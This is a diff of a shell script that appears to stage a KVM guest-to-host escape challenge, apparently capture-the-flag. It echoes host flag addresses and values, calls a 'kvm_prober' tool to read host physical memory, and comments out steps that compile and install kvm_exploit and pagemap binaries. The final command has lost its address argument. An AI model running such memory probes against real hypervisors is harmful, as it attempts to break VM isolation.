@@ -64,16 +64,6 @@ sleep 2
 echo "[*] allocating memory for kvm_prober..."
 kvm_prober allocvqpage
 
-sleep 2
-echo "[*] host VA and PA addresses"
-echo "Write flag address: 0xffffffff826279a8    0x64279a8"
-echo "Read flag address:  0xffffffff82b5ee10    0x695ee10"
-
-sleep 5
-echo "[*] Write flags default value"
-echo "deadbeef41424344"
-echo "with little endian: 44434241efbeadde"
-
 echo "Potential HPA 2 GPA = 0x3B000000"
 sleep 2
 
@@ -92,32 +82,44 @@ echo "[*] Checking potential addresses for flags"
 
 sleep 5
 
-echo "compiling other exploits"
+#echo "compiling other exploits"
+
+#sleep 2
+
+#gcc -o kvm_exploit kvm_exploit.c
+
+#sleep 5
+
+#cp kvm_exploit /bin
+
+#sleep 5
+
+#gcc -o pagemap pagemap.c
+
+#sleep 5
+
+#cp pagemap /bin
+
+#sleep 5
+
+#sleep 5
 
 sleep 2
-
-gcc -o kvm_exploit kvm_exploit.c
-
-sleep 5
-
-cp kvm_exploit /bin
+echo "[*] host VA and PA addresses"
+echo "Write flag address: 0xffffffff826279a8    0x64279a8"
+echo "Read flag address:  0xffffffff82b5ee10    0x695ee10"
 
 sleep 5
 
-gcc -o pagemap pagemap.c
-
-sleep 5
-
-cp pagemap /bin
-
-sleep 5
-
-sleep 5
 echo "[*] Write flags default value"
 echo "deadbeef41424344"
 echo "with little endian: 44434241efbeadde"
 
 sleep 5
 
-echo "[*] testing kvm_prober readhostphys 0x76000000 4096"
-kvm_prober readhostphys 0x76000000 4096
+echo "potential write_flag address 0x632cf9a8"
+
+sleep 5
+
+echo "[*] testing kvm_prober readhostphys 0x632cf9a8 64"
+kvm_prober readhostphys  4096
